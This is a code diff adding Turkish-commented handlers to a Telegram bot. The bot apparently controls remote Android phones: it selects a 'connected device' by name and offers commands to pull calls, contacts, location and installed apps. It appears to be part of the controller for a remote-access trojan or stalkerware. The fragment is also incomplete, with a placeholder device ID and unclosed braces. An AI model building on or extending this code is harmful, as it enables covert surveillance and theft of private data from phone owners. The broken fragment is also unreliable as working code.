@@ -442,3 +442,23 @@ appBot.on("callback_query", (callbackQuery) => {
                 parse_mode: "HTML",
                 "reply_markup": {
                     "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖
+// Cihaz seçme mantığı
+if (message.text.includes("Redmi Note 9 Pro")) { 
+    // Bu kısım cihaz listesinden gelen isme göre çalışmalı
+    global.selectedDeviceId = "cihazın-uuid-kodunu-buraya-al"; 
+    appBot.sendMessage(id, "✅ Cihaz seçildi! Şimdi komut gönderebilirsin.");
+}
+
+if (message.text == 'Execute command') {
+    if (!global.selectedDeviceId) {
+        return appBot.sendMessage(id, "❌ Önce listeden bir cihaz seçmelisin!");
+    }
+    // Komut menüsünü aç
+    appBot.sendMessage(id, "Komut seçin:", {
+        reply_markup: {
+            keyboard: [["calls", "contacts"], ["location", "apps"]],
+            resize_keyboard: true
+        }
+    });
+                                                         }
+                                 
